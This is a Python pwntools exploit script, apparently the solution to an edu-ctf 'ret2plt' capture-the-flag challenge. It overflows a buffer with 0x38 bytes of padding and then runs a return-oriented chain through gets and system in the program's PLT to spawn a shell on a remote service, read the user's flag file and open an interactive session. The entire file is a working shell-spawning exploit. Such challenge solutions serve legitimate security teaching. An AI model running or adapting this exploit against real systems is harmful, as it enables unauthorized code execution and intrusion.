#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

y = remote( 'localhost' , 10174 )
#y = remote( 'edu-ctf.csie.org' , 10174 )
#y = process( '../ret2plt/share/ret2plt' )
#pause()

pop_rdi = 0x0000000000400733

gets_plt = 0x400530
system_plt = 0x400520
bss = 0x601070

p = flat(
    'a' * 0x38,
    pop_rdi,
    bss,
    gets_plt,
    pop_rdi,
    bss,
    system_plt
)

y.sendlineafter( ':D' , p )

y.sendline( 'sh' )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()